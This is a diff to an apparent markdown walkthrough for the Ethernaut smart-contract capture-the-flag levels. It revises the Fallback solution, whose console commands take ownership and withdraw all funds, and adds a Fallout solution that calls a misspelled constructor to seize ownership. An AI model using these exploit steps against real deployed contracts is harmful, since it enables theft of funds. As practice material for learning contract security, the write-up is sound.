@@ -23,11 +23,27 @@
 
 ```js
 await contract.contribute({ value: toWei("0.000001") }) // contribute first, so that you'll be able to call receive
-await contract.getContribution().then(fund => fromWei(fund.toString())) // confirm that you have contributed
+await contract.getContribution().then(fund => fromWei(fund.toString())) // confirm if you have contributed
 await sendTransaction({from: player, to: contract.address, value: toWei('0.000001')}) // call receive with some ether sent
-let owner = await contract.owner() // get who is the owner now
-owner === player // check if you're the owner
+await contract.owner() === player // check if you're the owner now
 await contract.withdraw() // take all the funds out from the contract!!!
 ```
 
 ## 2. Fallout ★☆☆☆☆
+
+### ### Target
+
+1. Take ownership of the contract
+
+### Break Down & Analyze
+
+The constructor has typo: Fal”1”out. Since the wrong spelling, it is served as a function rather than a constructor, so everyone can call it and take the ownership.
+
+### Detailed Steps
+
+```js
+await contract.Fal1out() // call the wrong-spelled function to take ownership
+await contract.owner() === player // check if you're the owner now
+```
+
+## 3. Coin Flip ★★☆☆☆
